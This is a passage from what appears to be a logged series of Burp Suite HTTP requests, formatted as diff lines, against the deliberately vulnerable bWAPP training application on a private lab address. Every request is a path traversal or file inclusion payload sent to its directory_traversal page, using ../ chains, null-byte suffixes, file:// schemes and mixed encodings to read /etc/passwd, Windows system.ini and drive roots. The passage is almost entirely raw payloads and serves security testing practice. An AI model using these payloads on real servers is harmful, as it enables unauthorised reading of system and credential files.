+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=Windows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=Windows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2Fetc%2Fpasswd HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2Fetc%2Fpasswd%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2Fetc%2Fpasswd%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=etc%2Fpasswd HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=etc%2Fpasswd%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=etc%2Fpasswd%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fetc%2Fpasswd HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fetc%2Fpasswd%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fetc%2Fpasswd%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cetc%2Fpasswd HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cetc%2Fpasswd%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cetc%2Fpasswd%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fc%3A%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cc%3A%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%5C HTTP/1.1
+Host: 192.168.118.128
